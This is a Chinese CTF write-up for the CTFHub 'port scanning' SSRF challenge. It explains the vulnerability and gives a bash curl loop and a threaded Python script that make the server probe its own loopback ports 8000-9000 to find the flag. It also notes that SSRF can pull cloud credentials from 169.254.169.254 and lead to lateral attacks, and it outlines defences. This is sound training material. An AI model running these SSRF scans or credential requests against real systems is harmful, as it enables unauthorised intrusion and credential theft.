CTFHub SSRF - 端口扫描

2026年9月22日 CTFHub Web安全 SSRF 端口扫描

一、题目信息

  • 题目名称：端口扫描（SSRF）
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / SSRF（服务端请求伪造） / 内网端口探测
  • 靶场链接：http://challenge-8f647ea892520a41.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、Burp Suite（或Python/终端脚本）

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用 SSRF 漏洞对内网进行端口扫描。后端代码使用请求函数去请求用户传入的 URL。题目提示“端口范围是 8000-9000”。由于防火墙限制，我们无法直接访问服务器的内网端口，但服务器本身可以。我们需要让服务器去连接 127.0.0.1 的各个端口，通过观察响应差异找出开放端口，进而获取 Flag。

2. 怎么想（破题思路）

  • 题目提示“在线扫端口，端口范围是 8000-9000”。
  • URL 参数为 ?url=_，说明存在 SSRF 漏洞。
  • 构造请求，让服务器访问 http://127.0.0.1:端口号。关闭的端口会超时或报错，开放的端口会返回正常的 HTTP 响应，其中包含 Flag。
  • 由于范围有 1001 个端口，手动尝试效率极低，必须使用自动化工具（Burp Intruder、Python 脚本等）。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Burp Suite 社区版限制 Intruder 速度

踩坑情况：使用 Burp 设置好数字范围（8000-9000）并点击 Start attack，弹窗提示“Community Edition 限制攻击速度（time throttled）”。

原因分析：Burp 专业版才支持高速并发。社区版由于限制，跑完 1001 个端口可能需要十几分钟，如果环境倒计时快到了，会来不及。

改进方式：放弃 Burp 爆破，改用 Python 脚本或系统终端命令进行并发扫描。

踩坑记录二：Python 交互式终端卡在 if> 提示符

踩坑情况：直接在终端输入了多行 Python 代码（包括 for 循环和 if 判断），终端卡在 if> 等待输入，无法执行。

原因分析：交互式环境（>>>）不支持直接粘贴多行带缩进的代码。需要将其保存为 .py 文件后再执行，或使用单行命令。

改进方式：使用 nano scan.py 保存文件后运行 python3 scan.py，或直接使用 Bash 的单行 for 循环命令。

详细实操步骤（使用终端命令一键扫描）

在正常终端提示符下，直接复制并执行以下命令：

for i in $(seq 8000 9000); do res=$(curl -s -m 1 "http://challenge-8f647ea892520a41.sandbox.ctfhub.com:10800/?url=http://127.0.0.1:$i"); if [[ $res == *"ctfhub"* ]]; then echo "🔥 成功找到开放端口: $i"; echo "$res"; break; fi; echo -n "."; done

命令逐字深度解析：

  • for i in $(seq 8000 9000); do：生成 8000 到 9000 的数字循环。
  • res=$(curl -s -m 1 "URL/?url=http://127.0.0.1:$i")：使用 curl 发起请求，-s 静默模式，-m 1 设置超时为 1 秒防止卡死。
  • if [[ $res == *"ctfhub"* ]]：判断响应内容中是否包含 "ctfhub" 关键字。
  • echo "🔥 成功找到开放端口: $i"：找到则打印端口号。
  • echo "$res"：打印 Flag 内容。
  • break：找到后跳出循环。

备选方案（Python 脚本文件）：

在终端执行 nano scan.py，粘贴以下代码，按 Ctrl+X 保存，运行 python3 scan.py：

import requests
import concurrent.futures

base_url = "http://challenge-8f647ea892520a41.sandbox.ctfhub.com:10800/?url=http://127.0.0.1:"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"}

def check_port(port):
    try:
        r = requests.get(base_url + str(port), headers=headers, timeout=3)
        if r.status_code == 200 and "ctfhub" in r.text:
            return port, r.text.strip()
    except:
        pass
    return None

print("开始并发扫描...")
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(check_port, p) for p in range(8000, 9001)]
    for future in concurrent.futures.as_completed(futures):
        res = future.result()
        if res:
            print(f"\n[+] 成功！端口: {res[0]}")
            print(f"[+] 响应: {res[1]}")
            break

第三步：提交 Flag

扫描结果会直接打印出开放端口和 Flag，复制 Flag 提交即可通关。

4. 怎么迁移（跨领域联想）

  • 内网资产测绘：在真实渗透中，SSRF 端口扫描常用于发现内网中未授权的 Redis（6379）、MySQL（3306）、Jenkins（8080）等服务，进而发起横向攻击。
  • 云环境元数据获取：利用 SSRF 访问 http://169.254.169.254/ 可以获取云主机的临时凭证（AK/SK），这是云安全中的高危风险。
  • 安全开发（SDL）：防御 SSRF 需要限制服务器访问内网地址（如 127.0.0.1、192.168.*），并禁用不必要的协议（如 gopher、file）。

三、名词大全与原理深度复盘

1. SSRF 端口扫描原理

服务器根据用户输入的 URL 发起网络请求，当请求内网 IP 的特定端口时，开放的端口会返回正常的 HTTP 响应（如 200 OK），而关闭的端口则不会有响应或报错。通过对比响应状态码、响应长度或响应时间，就能判断端口是否开放。

2. 环回地址（Loopback Address）

通常指 127.0.0.1 或 localhost，指向机器自身。许多内部服务（如数据库、管理后台）默认只监听环回地址，外部无法访问。SSRF 正是利用服务器自身的权限，打破了这层隔离。

3. 并发与超时机制

在端口扫描中，如果每个请求都同步等待响应，效率极低。使用 Python 的 concurrent.futures 或终端的 for 循环配合 curl -m 1，可以大大提高扫描速度，避免因单个端口卡死导致整个任务失败。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与“内网访问”的区别：“内网访问”是直接请求已知的内网路径（flag.php）；本题是需要先探测“门”（端口）在哪里，再获取数据。这是从“已知路径”到“未知路径测绘”的转变。
  • 与“伪协议读取文件”的区别：伪协议是直接读取本地文件系统；端口扫描是探测网络服务的存在，属于网络层的信息收集。

2. 这种题目的出现原因

开发人员为了提供方便的功能（如 URL 预览、在线代理），直接处理用户传入的 URL 发起请求，但没有对目标地址做严格的校验（如禁止访问内网网段）。这属于典型的“功能越权”漏洞。

3. 这种应用在实际中如何体现？

在红蓝对抗中，SSRF 是打点内网的关键入口。攻击者常利用它来探测内网的存活主机和服务，进而利用未授权访问或弱口令漏洞控制内网服务器。

4. 如何抽象理解概念（大白话理解）

把服务器比作一个传令兵：

  • 端口扫描：你想知道目标大楼里有哪些房间（端口）是开着的。你不能亲自进去，但你让传令兵挨个去敲 8000 到 9000 号房间的门。
  • 自动化脚本：如果让传令兵一个一个去敲，太慢了。你写了一张纸条（脚本），让他带着 1000 个敲门指令，一旦有人应门（返回 ctfhub），立刻把门牌号告诉你。
  • 结果：传令兵跑了一圈，发现 8888 号房间有人，并且把里面的人告诉他的 Flag 带回来给了你。
